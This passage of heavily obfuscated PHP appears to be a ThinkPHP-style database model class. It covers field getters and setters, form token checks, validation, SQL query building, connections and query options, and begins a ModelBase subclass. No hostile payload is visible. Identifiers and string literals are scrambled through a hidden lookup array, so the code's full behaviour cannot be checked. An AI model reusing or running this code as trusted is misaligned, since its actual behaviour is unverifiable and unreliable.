unset($ÍÛÊÛ±í[$¢Î…Æä¶]); } } } } return $ÍÛÊÛ±í; } public function setField($è¬Û á‚, $¼ôú› = '') { if (is_array($è¬Û á‚)) { $ï¹ÍÍ´é = $è¬Û á‚; } else { $ï¹ÍÍ´é[$è¬Û á‚] = $¼ôú›; } return $this->save($ï¹ÍÍ´é); } public function setAdd($»®¹¢, $ıêû¿…ş = 1) { $û™µ–„ =& $_SERVER[•Ùç É]; $±Õİ¹…ä = $»®¹¢ . $û™µ–„[342] . $ıêû¿…ş; if ($ıêû¿…ş < 0) { $±Õİ¹…ä = $»®¹¢ . $ıêû¿…ş; } return $this->setField($»®¹¢, array($û™µ–„[343], $±Õİ¹…ä)); } public function getField($¢š­áÁŠ, $Ñ€µ‚ÏÂ = null) { $æ€´÷¸ =& $_SERVER[•Ùç É]; $Êİ”’ãÛ[$æ€´÷¸[319]] = $¢š­áÁŠ; $Êİ”’ãÛ = $this->_parseOptions($Êİ”’ãÛ); $¢š­áÁŠ = trim($¢š­áÁŠ); if (strpos($¢š­áÁŠ, $æ€´÷¸[50])) { if (!isset($Êİ”’ãÛ[$æ€´÷¸[338]])) { $Êİ”’ãÛ[$æ€´÷¸[338]] = is_numeric($Ñ€µ‚ÏÂ) ? $Ñ€µ‚ÏÂ : $æ€´÷¸[12]; } $‰àÖÏ¹Ñ = $this->db->select($Êİ”’ãÛ); if (!empty($‰àÖÏ¹Ñ)) { $È‰ÎÁÛŠ = explode($æ€´÷¸[50], $¢š­áÁŠ); $¢š­áÁŠ = array_keys($‰àÖÏ¹Ñ[0]); $Ê‹’Ì¨œ = array_shift($¢š­áÁŠ); $Ñ‹Ñ¼Ñ± = array_shift($¢š­áÁŠ); $°£÷‡»Ÿ = array(); $£‡ÙüÑ¼ = count($È‰ÎÁÛŠ); foreach ($‰àÖÏ¹Ñ as $€¹‡ùÓ) { $â’ÍŸ« = $€¹‡ùÓ[$Ê‹’Ì¨œ]; if (2 == $£‡ÙüÑ¼) { $°£÷‡»Ÿ[$â’ÍŸ«] = $€¹‡ùÓ[$Ñ‹Ñ¼Ñ±]; } else { $°£÷‡»Ÿ[$â’ÍŸ«] = is_string($Ñ€µ‚ÏÂ) ? implode($Ñ€µ‚ÏÂ, $€¹‡ùÓ) : $€¹‡ùÓ; } } return $°£÷‡»Ÿ; } } else { if (!0 !== $Ñ€µ‚ÏÂ) { $Êİ”’ãÛ[$æ€´÷¸[338]] = is_numeric($Ñ€µ‚ÏÂ) ? $Ñ€µ‚ÏÂ : 1; } if ($Ñ€µ‚ÏÂ === $æ€´÷¸[301]) { unset($Êİ”’ãÛ[$æ€´÷¸[338]]); } $€¹‡ùÓ = $this->db->select($Êİ”’ãÛ); if (!empty($€¹‡ùÓ)) { if ($Ñ€µ‚ÏÂ === $æ€´÷¸[301]) { return reset($€¹‡ùÓ[0]); } if (!0 !== $Ñ€µ‚ÏÂ && 1 == $Êİ”’ãÛ[$æ€´÷¸[338]]) { return reset($€¹‡ùÓ[0]); } foreach ($€¹‡ùÓ as $ÑŒÓğ«Ì) { $¦à¦¹”ò[] = $ÑŒÓğ«Ì[$¢š­áÁŠ]; } return $¦à¦¹”ò; } } return null; } public function create($µ¶ë–˜ = '', $ ñš»¹Õ = '') { $Š„éäªÁ =& $_SERVER[•Ùç É]; if (empty($µ¶ë–˜)) { $µ¶ë–˜ = $_POST; } elseif (is_object($µ¶ë–˜)) { $µ¶ë–˜ = get_object_vars($µ¶ë–˜); } if (empty($µ¶ë–˜) || !is_array($µ¶ë–˜)) { $this->error = think_lang($Š„éäªÁ[317]); return !1; } $µ¶ë–˜ = $this->parseFieldsMap($µ¶ë–˜, 0); $ ñš»¹Õ = $ ñš»¹Õ ? $ ñš»¹Õ : (!empty($µ¶ë–˜[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Š„éäªÁ[319]])) { $–ÍÊÖ÷ü = $this->options[$Š„éäªÁ[319]]; unset($this->options[$Š„éäªÁ[319]]); } elseif ($ ñš»¹Õ == THINK_MODEL_INSERT && isset($this->insertFields)) { $–ÍÊÖ÷ü = $this->insertFields; } elseif ($ ñš»¹Õ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $–ÍÊÖ÷ü = $this->updateFields; } if (isset($–ÍÊÖ÷ü)) { if (is_string($–ÍÊÖ÷ü)) { $–ÍÊÖ÷ü = explode($Š„éäªÁ[50], $–ÍÊÖ÷ü); } if (think_config($Š„éäªÁ[344])) { $–ÍÊÖ÷ü[] = think_config($Š„éäªÁ[345]); } foreach ($µ¶ë–˜ as $×¿ìŒºî => $½ˆ³•Éœ) { if (!in_array($×¿ìŒºî, $–ÍÊÖ÷ü)) { unset($µ¶ë–˜[$×¿ìŒºî]); } } } if (!$this->autoValidation($µ¶ë–˜, $ ñš»¹Õ)) { return !1; } if (!$this->autoCheckToken($µ¶ë–˜)) { $this->error = think_lang($Š„éäªÁ[346]); return !1; } if ($this->autoCheckFields) { $–ÍÊÖ÷ü = $this->getDbFields(); foreach ($µ¶ë–˜ as $×¿ìŒºî => $½ˆ³•Éœ) { if (!in_array($×¿ìŒºî, $–ÍÊÖ÷ü)) { unset($µ¶ë–˜[$×¿ìŒºî]); } elseif (MAGIC_QUOTES_GPC && is_string($½ˆ³•Éœ)) { $µ¶ë–˜[$×¿ìŒºî] = stripslashes($½ˆ³•Éœ); } } } $this->autoOperation($µ¶ë–˜, $ ñš»¹Õ); $this->data = $µ¶ë–˜; return $µ¶ë–˜; } public function autoCheckToken($¬¹À®¯) { $ˆ¿¾û¯ø =& $_SERVER[•Ùç É]; if (isset($this->options[$ˆ¿¾û¯ø[347]]) && !$this->options[$ˆ¿¾û¯ø[347]]) { return !0; } if (think_config($ˆ¿¾û¯ø[344])) { $É¯üÉñò = think_config($ˆ¿¾û¯ø[345]); if (!isset($¬¹À®¯[$É¯üÉñò]) || Session::get($É¯üÉñò)) { return !1; } list($Â“ô†ôÔ, $¶¡•€“Ù) = explode($ˆ¿¾û¯ø[11], $¬¹À®¯[$É¯üÉñò]); if ($¶¡•€“Ù && Session::get($É¯üÉñò . $ˆ¿¾û¯ø[10] . $Â“ô†ôÔ) === $¶¡•€“Ù) { Session::remove($É¯üÉñò . $ˆ¿¾û¯ø[10] . $Â“ô†ôÔ); return !0; } if (think_config($ˆ¿¾û¯ø[348])) { Session::remove($É¯üÉñò . $ˆ¿¾û¯ø[10] . $Â“ô†ôÔ); } return !1; } return !0; } public function regex($ãÂ†³±ü, $ÊË±‡÷‚) { $°Õ«Œ–é =& $_SERVER[•Ùç É]; $¬È°ğÃú = array($°Õ«Œ–é[349] => $°Õ«Œ–é[350], $°Õ«Œ–é[351] => $°Õ«Œ–é[352], $°Õ«Œ–é[353] => $°Õ«Œ–é[354], $°Õ«Œ–é[355] => $°Õ«Œ–é[356], $°Õ«Œ–é[357] => $°Õ«Œ–é[358], $°Õ«Œ–é[359] => $°Õ«Œ–é[360], $°Õ«Œ–é[361] => $°Õ«Œ–é[362], $°Õ«Œ–é[336] => $°Õ«Œ–é[363], $°Õ«Œ–é[364] => $°Õ«Œ–é[365]); if (isset($¬È°ğÃú[strtolower($ÊË±‡÷‚)])) { $ÊË±‡÷‚ = $¬È°ğÃú[strtolower($ÊË±‡÷‚)]; } return preg_match($ÊË±‡÷‚, $ãÂ†³±ü) === 1; } private function autoOperation(&$ÇŸ«³çƒ, $ØÇä„¨¸) { $âİ‰ÌĞ¤ =& $_SERVER[•Ùç É]; if (!empty($this->options[$âİ‰ÌĞ¤[366]])) { $ÙÏ”ÏÖÏ = $this->options[$âİ‰ÌĞ¤[366]]; unset($this->options[$âİ‰ÌĞ¤[366]]); } elseif (!empty($this->_auto)) { $ÙÏ”ÏÖÏ = $this->_auto; } if (isset($ÙÏ”ÏÖÏ)) { foreach ($ÙÏ”ÏÖÏ as $¼ûüÅ«Ñ) { if (empty($¼ûüÅ«Ñ[2])) { $¼ûüÅ«Ñ[2] = THINK_MODEL_INSERT; } if ($ØÇä„¨¸ == $¼ûüÅ«Ñ[2] || $¼ûüÅ«Ñ[2] == THINK_MODEL_BOTH) { switch (trim($¼ûüÅ«Ñ[3])) { case $âİ‰ÌĞ¤[367]: case $âİ‰ÌĞ¤[368]: $—é±¯ = isset($¼ûüÅ«Ñ[4]) ? (array) $¼ûüÅ«Ñ[4] : array(); if (isset($ÇŸ«³çƒ[$¼ûüÅ«Ñ[0]])) { array_unshift($—é±¯, $ÇŸ«³çƒ[$¼ûüÅ«Ñ[0]]); } if ($âİ‰ÌĞ¤[367] == $¼ûüÅ«Ñ[3]) { $ÇŸ«³çƒ[$¼ûüÅ«Ñ[0]] = call_user_func_array($¼ûüÅ«Ñ[1], $—é±¯); } else { $ÇŸ«³çƒ[$¼ûüÅ«Ñ[0]] = call_user_func_array(array(&$this, $¼ûüÅ«Ñ[1]), $—é±¯); } break; case $âİ‰ÌĞ¤[319]: $ÇŸ«³çƒ[$¼ûüÅ«Ñ[0]] = $ÇŸ«³çƒ[$¼ûüÅ«Ñ[1]]; break; case $âİ‰ÌĞ¤[369]: if ($âİ‰ÌĞ¤[12] === $ÇŸ«³çƒ[$¼ûüÅ«Ñ[0]]) { unset($ÇŸ«³çƒ[$¼ûüÅ«Ñ[0]]); } break; case $âİ‰ÌĞ¤[370]: default: $ÇŸ«³çƒ[$¼ûüÅ«Ñ[0]] = $¼ûüÅ«Ñ[1]; } if (!1 === $ÇŸ«³çƒ[$¼ûüÅ«Ñ[0]]) { unset($ÇŸ«³çƒ[$¼ûüÅ«Ñ[0]]); } } } } return $ÇŸ«³çƒ; } protected function autoValidation($Ã»©À‹ã, $¢Àåç¿à) { $¦ğôÎÄ¥ =& $_SERVER[•Ùç É]; if (!empty($this->options[$¦ğôÎÄ¥[371]])) { $ªóï‹Â‡ = $this->options[$¦ğôÎÄ¥[371]]; unset($this->options[$¦ğôÎÄ¥[371]]); } elseif (!empty($this->_validate)) { $ªóï‹Â‡ = $this->_validate; } if (isset($ªóï‹Â‡)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ªóï‹Â‡ as $Øù±šË¥ => $Ô¸›Ùƒ) { if (empty($Ô¸›Ùƒ[5]) || $Ô¸›Ùƒ[5] == THINK_MODEL_BOTH || $Ô¸›Ùƒ[5] == $¢Àåç¿à) { if (0 == strpos($Ô¸›Ùƒ[2], $¦ğôÎÄ¥[372]) && strpos($Ô¸›Ùƒ[2], $¦ğôÎÄ¥[373])) { $Ô¸›Ùƒ[2] = think_lang(substr($Ô¸›Ùƒ[2], 2, -1)); } $Ô¸›Ùƒ[3] = isset($Ô¸›Ùƒ[3]) ? $Ô¸›Ùƒ[3] : THINK_EXISTS_VALIDATE; $Ô¸›Ùƒ[4] = isset($Ô¸›Ùƒ[4]) ? $Ô¸›Ùƒ[4] : $¦ğôÎÄ¥[374]; switch ($Ô¸›Ùƒ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ã»©À‹ã, $Ô¸›Ùƒ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¦ğôÎÄ¥[12] != trim($Ã»©À‹ã[$Ô¸›Ùƒ[0]])) { if (!1 === $this->_validationField($Ã»©À‹ã, $Ô¸›Ùƒ)) { return !1; } } break; default: if (isset($Ã»©À‹ã[$Ô¸›Ùƒ[0]])) { if (!1 === $this->_validationField($Ã»©À‹ã, $Ô¸›Ùƒ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ù‡ãşò¹, $­éóº—­) { if (!1 === $this->_validationFieldItem($Ù‡ãşò¹, $­éóº—­)) { if ($this->patchValidate) { $this->error[$­éóº—­[0]] = $­éóº—­[2]; } else { $this->error = $­éóº—­[2]; return !1; } } return; } protected function _validationFieldItem($éñïıõ, $¤Òı’İ) { $úÅ¹Ê‰– =& $_SERVER[•Ùç É]; switch (strtolower(trim($¤Òı’İ[4]))) { case $úÅ¹Ê‰–[367]: case $úÅ¹Ê‰–[368]: $Ñí‚áİö = isset($¤Òı’İ[6]) ? (array) $¤Òı’İ[6] : array(); if (is_string($¤Òı’İ[0]) && strpos($¤Òı’İ[0], $úÅ¹Ê‰–[50])) { $¤Òı’İ[0] = explode($úÅ¹Ê‰–[50], $¤Òı’İ[0]); } if (is_array($¤Òı’İ[0])) { foreach ($¤Òı’İ[0] as $¶ôĞÉ®ê) { $×Í°á ı[$¶ôĞÉ®ê] = $éñïıõ[$¶ôĞÉ®ê]; } array_unshift($Ñí‚áİö, $×Í°á ı); } else { array_unshift($Ñí‚áİö, $éñïıõ[$¤Òı’İ[0]]); } if ($úÅ¹Ê‰–[367] == $¤Òı’İ[4]) { return call_user_func_array($¤Òı’İ[1], $Ñí‚áİö); } else { return call_user_func_array(array(&$this, $¤Òı’İ[1]), $Ñí‚áİö); } case $úÅ¹Ê‰–[375]: return $éñïıõ[$¤Òı’İ[0]] == $éñïıõ[$¤Òı’İ[1]]; case $úÅ¹Ê‰–[376]: if (is_string($¤Òı’İ[0]) && strpos($¤Òı’İ[0], $úÅ¹Ê‰–[50])) { $¤Òı’İ[0] = explode($úÅ¹Ê‰–[50], $¤Òı’İ[0]); } $ôËà„·Õ = array(); if (is_array($¤Òı’İ[0])) { foreach ($¤Òı’İ[0] as $¶ôĞÉ®ê) { $ôËà„·Õ[$¶ôĞÉ®ê] = $éñïıõ[$¶ôĞÉ®ê]; } } else { $ôËà„·Õ[$¤Òı’İ[0]] = $éñïıõ[$¤Òı’İ[0]]; } if (!empty($éñïıõ[$this->getPk()])) { $ôËà„·Õ[$this->getPk()] = array($úÅ¹Ê‰–[377], $éñïıõ[$this->getPk()]); } if ($this->where($ôËà„·Õ)->find()) { return !1; } return !0; default: return $this->check($éñïıõ[$¤Òı’İ[0]], $¤Òı’İ[1], $¤Òı’İ[4]); } } public function check($Ì²±Êî, $œ€ÙĞáà, $èáèéïú = "\162\145\147\145\170") { $ûÃ‹º´ =& $_SERVER[•Ùç É]; $èáèéïú = strtolower(trim($èáèéïú)); switch ($èáèéïú) { case $ûÃ‹º´[7]: case $ûÃ‹º´[378]: $áßå£¡Á = is_array($œ€ÙĞáà) ? $œ€ÙĞáà : explode($ûÃ‹º´[50], $œ€ÙĞáà); return $èáèéïú == $ûÃ‹º´[7] ? in_array($Ì²±Êî, $áßå£¡Á) : !in_array($Ì²±Êî, $áßå£¡Á); case $ûÃ‹º´[379]: case $ûÃ‹º´[380]: if (is_array($œ€ÙĞáà)) { $’”Ç¥’ = $œ€ÙĞáà[0]; $û•ı´³ù = $œ€ÙĞáà[1]; } else { list($’”Ç¥’, $û•ı´³ù) = explode($ûÃ‹º´[50], $œ€ÙĞáà); } return $èáèéïú == $ûÃ‹º´[379] ? $Ì²±Êî >= $’”Ç¥’ && $Ì²±Êî <= $û•ı´³ù : $Ì²±Êî < $’”Ç¥’ || $Ì²±Êî > $û•ı´³ù; case $ûÃ‹º´[381]: case $ûÃ‹º´[382]: return $èáèéïú == $ûÃ‹º´[381] ? $Ì²±Êî == $œ€ÙĞáà : $Ì²±Êî != $œ€ÙĞáà; case $ûÃ‹º´[383]: $¦ü¾ã–Ü = mb_strlen($Ì²±Êî, $ûÃ‹º´[384]); if (strpos($œ€ÙĞáà, $ûÃ‹º´[50])) { list($’”Ç¥’, $û•ı´³ù) = explode($ûÃ‹º´[50], $œ€ÙĞáà); return $¦ü¾ã–Ü >= $’”Ç¥’ && $¦ü¾ã–Ü <= $û•ı´³ù; } else { return $¦ü¾ã–Ü == $œ€ÙĞáà; } case $ûÃ‹º´[385]: list($é×’ø, $ßÆšİ«š) = explode($ûÃ‹º´[50], $œ€ÙĞáà); if (!is_numeric($é×’ø)) { $é×’ø = strtotime($é×’ø); } if (!is_numeric($ßÆšİ«š)) { $ßÆšİ«š = strtotime($ßÆšİ«š); } return NOW_TIME >= $é×’ø && NOW_TIME <= $ßÆšİ«š; case $ûÃ‹º´[386]: return in_array(get_client_ip(), explode($ûÃ‹º´[50], $œ€ÙĞáà)); case $ûÃ‹º´[387]: return !in_array(get_client_ip(), explode($ûÃ‹º´[50], $œ€ÙĞáà)); case $ûÃ‹º´[374]: default: return $this->regex($Ì²±Êî, $œ€ÙĞáà); } } public function query($½–°Î, $Í˜§Ô” = false) { $†¤î¨Åâ =& $_SERVER[•Ùç É]; if (!is_bool($Í˜§Ô”) && !is_array($Í˜§Ô”)) { $Í˜§Ô” = func_get_args(); array_shift($Í˜§Ô”); } $½–°Î = str_replace(array($†¤î¨Åâ[248], $†¤î¨Åâ[388]), $†¤î¨Åâ[53], $½–°Î); $½–°Î = $this->parseSql($½–°Î, $Í˜§Ô”); return $this->db->query($½–°Î); } public function execute($˜”£Ÿ©, $ö‚¿¡Ô = false) { if (!is_bool($ö‚¿¡Ô) && !is_array($ö‚¿¡Ô)) { $ö‚¿¡Ô = func_get_args(); array_shift($ö‚¿¡Ô); } $˜”£Ÿ© = $this->parseSql($˜”£Ÿ©, $ö‚¿¡Ô); return $this->db->execute($˜”£Ÿ©); } protected function parseSql($ÉÅö¶ì£, $¶–óĞ–·) { $ö‘ó¨¢æ =& $_SERVER[•Ùç É]; if (!0 === $¶–óĞ–·) { $øıØ…éÈ = $this->_parseOptions(); $ÉÅö¶ì£ = $this->db->parseSql($ÉÅö¶ì£, $øıØ…éÈ); } elseif (is_array($¶–óĞ–·)) { $¶–óĞ–· = array_map(array($this->db, $ö‘ó¨¢æ[389]), $¶–óĞ–·); $ÉÅö¶ì£ = vsprintf($ÉÅö¶ì£, $¶–óĞ–·); } else { $ÉÅö¶ì£ = strtr($ÉÅö¶ì£, array($ö‘ó¨¢æ[390] => $this->getTableName(), $ö‘ó¨¢æ[391] => think_config($ö‘ó¨¢æ[290]))); } $this->db->setModel($this->name); return $ÉÅö¶ì£; } public function db($ƒÊ¦ıĞ = '', $¼¸Î§ŞÉ = '', $åâ‡¹ş = array()) { $€µ•àï§ =& $_SERVER[•Ùç É]; if ($€µ•àï§[12] === $ƒÊ¦ıĞ && $this->db) { return $this->db; } static $ôİ¾Öä§ = array(); static $º÷Šû¯ = array(); if (!isset($º÷Šû¯[$ƒÊ¦ıĞ]) || isset($º÷Šû¯[$ƒÊ¦ıĞ]) && $¼¸Î§ŞÉ && $ôİ¾Öä§[$ƒÊ¦ıĞ] != $¼¸Î§ŞÉ) { if (!empty($¼¸Î§ŞÉ) && is_string($¼¸Î§ŞÉ) && !1 === strpos($¼¸Î§ŞÉ, $€µ•àï§[8])) { $¼¸Î§ŞÉ = think_config($¼¸Î§ŞÉ); } $ƒÊ¦ıĞ = think_guid($¼¸Î§ŞÉ); $º÷Šû¯[$ƒÊ¦ıĞ] = Db::getInstance($¼¸Î§ŞÉ); } elseif (NULL === $¼¸Î§ŞÉ) { $º÷Šû¯[$ƒÊ¦ıĞ]->close(); unset($º÷Šû¯[$ƒÊ¦ıĞ]); return; } if (!empty($åâ‡¹ş)) { if (is_string($åâ‡¹ş)) { parse_str($åâ‡¹ş, $åâ‡¹ş); } foreach ($åâ‡¹ş as $Úçİğ„À => $éıè¢õı) { $this->setProperty($Úçİğ„À, $éıè¢õı); } } $ôİ¾Öä§[$ƒÊ¦ıĞ] = $¼¸Î§ŞÉ; $this->db = $º÷Šû¯[$ƒÊ¦ıĞ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ò€²‹…Ã = get_class($this); if ($ò€²‹…Ã == $_SERVER[•Ùç É][392]) { return $this->name; } $this->name = substr($ò€²‹…Ã, 0, -5); } return $this->name; } public function getTableName() { $¢×âµµ =& $_SERVER[•Ùç É]; if (empty($this->trueTableName)) { $Ú‘ÎÕ×İ = !empty($this->tablePrefix) ? $this->tablePrefix : $¢×âµµ[12]; if (!empty($this->tableName)) { $Ú‘ÎÕ×İ .= $this->tableName; } else { $Ú‘ÎÕ×İ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ú‘ÎÕ×İ); } return (!empty($this->dbName) ? $this->dbName . $¢×âµµ[10] : $¢×âµµ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $÷×ûû¯Â =& $_SERVER[•Ùç É]; return isset($this->fields[$÷×ûû¯Â[297]]) ? $this->fields[$÷×ûû¯Â[297]] : $this->pk; } public function getDbFields() { $œËÂÔ“· =& $_SERVER[•Ùç É]; if (isset($this->options[$œËÂÔ“·[325]])) { $¹û ‚”¡ = $this->db->getFields($this->options[$œËÂÔ“·[325]]); return $¹û ‚”¡ ? array_keys($¹û ‚”¡) : !1; } if ($this->fields) { $¹û ‚”¡ = $this->fields; unset($¹û ‚”¡[$œËÂÔ“·[296]], $¹û ‚”¡[$œËÂÔ“·[297]], $¹û ‚”¡[$œËÂÔ“·[298]], $¹û ‚”¡[$œËÂÔ“·[295]]); return $¹û ‚”¡; } return !1; } public function data($Îº¼ëšº = '') { $»¦†šß¿ =& $_SERVER[•Ùç É]; if ($»¦†šß¿[12] === $Îº¼ëšº && !empty($this->data)) { return $this->data; } if (is_object($Îº¼ëšº)) { $Îº¼ëšº = get_object_vars($Îº¼ëšº); } elseif (is_string($Îº¼ëšº)) { parse_str($Îº¼ëšº, $Îº¼ëšº); } elseif (!is_array($Îº¼ëšº)) { think_exception(think_lang($»¦†šß¿[317])); } $this->data = $Îº¼ëšº; return $this; } public function join($©¦¹›üƒ) { $––ùİÓ÷ =& $_SERVER[•Ùç É]; if (is_array($©¦¹›üƒ)) { $this->options[$––ùİÓ÷[328]] = $©¦¹›üƒ; } elseif (!empty($©¦¹›üƒ)) { $this->options[$––ùİÓ÷[328]][] = $©¦¹›üƒ; } return $this; } public function union($÷€á–Œ, $œïÀíÍ– = false) { $û¶ê¶§ó =& $_SERVER[•Ùç É]; if (empty($÷€á–Œ)) { return $this; } if ($œïÀíÍ–) { $this->options[$û¶ê¶§ó[393]][$û¶ê¶§ó[394]] = !0; } if (is_object($÷€á–Œ)) { $÷€á–Œ = get_object_vars($÷€á–Œ); } if (is_string($÷€á–Œ)) { $´şò¥ÖË = $÷€á–Œ; } elseif (is_array($÷€á–Œ)) { if (isset($÷€á–Œ[0])) { $this->options[$û¶ê¶§ó[393]] = array_merge($this->options[$û¶ê¶§ó[393]], $÷€á–Œ); return $this; } else { $´şò¥ÖË = $÷€á–Œ; } } else { think_exception(think_lang($û¶ê¶§ó[317])); } $this->options[$û¶ê¶§ó[393]][] = $´şò¥ÖË; return $this; } public function cache($ö±û¿û« = true, $ÎñÛÁ´• = null, $—½Ÿ¡¹™ = '') { $ëŠëæ»û =& $_SERVER[•Ùç É]; if (!1 !== $ö±û¿û«) { $this->options[$ëŠëæ»û[395]] = array($ëŠëæ»û[96] => $ö±û¿û«, $ëŠëæ»û[385] => $ÎñÛÁ´•, $ëŠëæ»û[33] => $—½Ÿ¡¹™); } return $this; } public function field($ıÉ¹ùï, $Œ° Ê» = false) { $‰£É¸° =& $_SERVER[•Ùç É]; if (!0 === $ıÉ¹ùï) { $ğ«ê¥™ò = $this->getDbFields(); $ıÉ¹ùï = $ğ«ê¥™ò ? $ğ«ê¥™ò : $‰£É¸°[205]; } elseif ($Œ° Ê») { if (is_string($ıÉ¹ùï)) { $ıÉ¹ùï = explode($‰£É¸°[50], $ıÉ¹ùï); } $ğ«ê¥™ò = $this->getDbFields(); $ıÉ¹ùï = $ğ«ê¥™ò ? array_diff($ğ«ê¥™ò, $ıÉ¹ùï) : $ıÉ¹ùï; } $this->options[$‰£É¸°[319]] = $ıÉ¹ùï; return $this; } public function scope($êÃ ó¾ì = '', $ÈßØĞ¥ = NULL) { $šœÅ¶¢Œ =& $_SERVER[•Ùç É]; if ($šœÅ¶¢Œ[12] === $êÃ ó¾ì) { if (isset($this->_scope[$šœÅ¶¢Œ[37]])) { $¤äç”ô = $this->_scope[$šœÅ¶¢Œ[37]]; } else { return $this; } } elseif (is_string($êÃ ó¾ì)) { $–‰è½¸ˆ = explode($šœÅ¶¢Œ[50], $êÃ ó¾ì); $¤äç”ô = array(); foreach ($–‰è½¸ˆ as $ÖËã õÔ) { if (!isset($this->_scope[$ÖËã õÔ])) { continue; } $¤äç”ô = array_merge($¤äç”ô, $this->_scope[$ÖËã õÔ]); } if (!empty($ÈßØĞ¥) && is_array($ÈßØĞ¥)) { $¤äç”ô = array_merge($¤äç”ô, $ÈßØĞ¥); } } elseif (is_array($êÃ ó¾ì)) { $¤äç”ô = $êÃ ó¾ì; } if (is_array($¤äç”ô) && !empty($¤äç”ô)) { $this->options = array_merge($this->options, array_change_key_case($¤äç”ô)); } return $this; } public function where($¸ïÁşıĞ, $¡…¸ëñ = null) { $¨ä€ùÄû =& $_SERVER[•Ùç É]; if (!is_null($¡…¸ëñ) && is_string($¸ïÁşıĞ)) { if (!is_array($¡…¸ëñ)) { $¡…¸ëñ = func_get_args(); array_shift($¡…¸ëñ); } $¡…¸ëñ = array_map(array($this->db, $¨ä€ùÄû[389]), $¡…¸ëñ); $¸ïÁşıĞ = vsprintf($¸ïÁşıĞ, $¡…¸ëñ); } elseif (is_object($¸ïÁşıĞ)) { $¸ïÁşıĞ = get_object_vars($¸ïÁşıĞ); } elseif (is_array($¸ïÁşıĞ)) { foreach ($¸ïÁşıĞ as $ù¶ìı¼º => $ìÒĞÙ¹İ) { if ((is_numeric($ù¶ìı¼º) || !$ù¶ìı¼º) && is_string($ìÒĞÙ¹İ)) { if (strpos($ìÒĞÙ¹İ, $¨ä€ùÄû[396]) === 0) { continue; } think_trace($¨ä€ùÄû[397], $¨ä€ùÄû[12], $¨ä€ùÄû[49]); die; } } } if (is_string($¸ïÁşıĞ) && $¨ä€ùÄû[12] != $¸ïÁşıĞ) { $İ™ïå« = array(); $İ™ïå«[$¨ä€ùÄû[398]] = $¸ïÁşıĞ; $¸ïÁşıĞ = $İ™ïå«; } if (isset($this->options[$¨ä€ùÄû[321]])) { $this->options[$¨ä€ùÄû[321]] = array_merge($this->options[$¨ä€ùÄû[321]], $¸ïÁşıĞ); } else { $this->options[$¨ä€ùÄû[321]] = $¸ïÁşıĞ; } return $this; } public function limit($©Èññ²¼, $Ğ¾³šªŠ = null) { $åÔŸ“Ñ =& $_SERVER[•Ùç É]; $this->options[$åÔŸ“Ñ[338]] = is_null($Ğ¾³šªŠ) ? $©Èññ²¼ : $©Èññ²¼ . $åÔŸ“Ñ[50] . $Ğ¾³šªŠ; return $this; } public function page($Ú¨ÖØ ‹, $òºŞ†Û = null) { $°•ÄÃë“ =& $_SERVER[•Ùç É]; $this->options[$°•ÄÃë“[399]] = is_null($òºŞ†Û) ? $Ú¨ÖØ ‹ : $Ú¨ÖØ ‹ . $°•ÄÃë“[50] . $òºŞ†Û; return $this; } public function comment($ºÜœ—µ›) { $this->options[$_SERVER[•Ùç É][400]] = $ºÜœ—µ›; return $this; } public function setProperty($¨®¤éëè, $–îˆ‡éÇ) { if (property_exists($this, $¨®¤éëè)) { $this->{$¨®¤éëè} = $–îˆ‡éÇ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\x54\x69\155\145", "\x74\151\155\x65", "\151\x6e\163\145\162\164\54\165\x70\x64\x61\x74\145", "\x66\165\x6e\x63\x74\x69\157\x6e"), array("\143\162\145\141\164\145\124\151\x6d\x65", "\x74\x69\155\x65", "\151\x6e\163\x65\162\x74", "\146\165\156\x63\164\x69\157\156")); public function setDataAuto($’ïëó) { $this->dataAuto = $’ïëó; } public function __construct($ôÃŠÄÖ“ = '', $–¶ö®º = '', $ã²½÷¥Ù = '') { parent::__construct($ôÃŠÄÖ“, $–¶ö®º, $ã²½÷¥Ù); } protected $tableMeta = array(); protected function _beforeInsert(&$–öùÖæÃ, $°•¢´¡) { $öìÕ¶‘· =& $_SERVER[•Ùç É]; if (!$this->checkDataAutoHas($öìÕ¶‘·[401])) { return; } $this->dataBeforeFilter($–öùÖæÃ, $öìÕ¶‘·[401]); } protected function _beforeUpdate(&$È°«¹öç, $øèÀŸ×„) { $Ú¥Èœİ =& $_SERVER[•Ùç É]; if (!$this->checkDataAutoHas($Ú¥Èœİ[402])) { return; } $this->dataBeforeFilter($È°«¹öç, $Ú¥Èœİ[402]); } protected function _afterSelect(&$´…é Œ, $ß…ÆñÔŠ) { if (!is_array($´…é Œ)) { return; } if (!$this->checkDataAutoHas($_SERVER[•Ùç É][403])) { return; } foreach ($´…é Œ as &$Û»ÍÌ´) { $this->dataAfterFilter($Û»ÍÌ´); } unset($Û»ÍÌ´); } protected function _afterFind(&$¨¦ÇÄ¹, $’ô°¹¨) { if (!is_array($¨¦ÇÄ¹)) { return; } if (!$this->checkDataAutoHas($_SERVER[•Ùç É][403])) { return; } $this->dataAfterFilter($¨¦ÇÄ¹); } public static function textEncode($Ÿ©şŞÙ) { if (!$Ÿ©şŞÙ) { return $Ÿ©şŞÙ; } $‚Í’»® = json_encode($Ÿ©şŞÙ); $‚Í’»® = preg_replace_callback($_SERVER[•Ùç É][404], function ($¾ö¥‚üõ) { return addslashes($¾ö¥‚üõ[0]); }, $‚Í’»®); return json_decode($‚Í’»®); } public static function textDecode($¡ÉÁ§áƒ) { $ÒšÒÁÇø =& $_SERVER[•Ùç É]; $½Ó¿í—Ø = json_encode($¡ÉÁ§áƒ); $½Ó¿í—Ø = preg_replace_callback($ÒšÒÁÇø[405], function ($š÷“Ç‡—) { 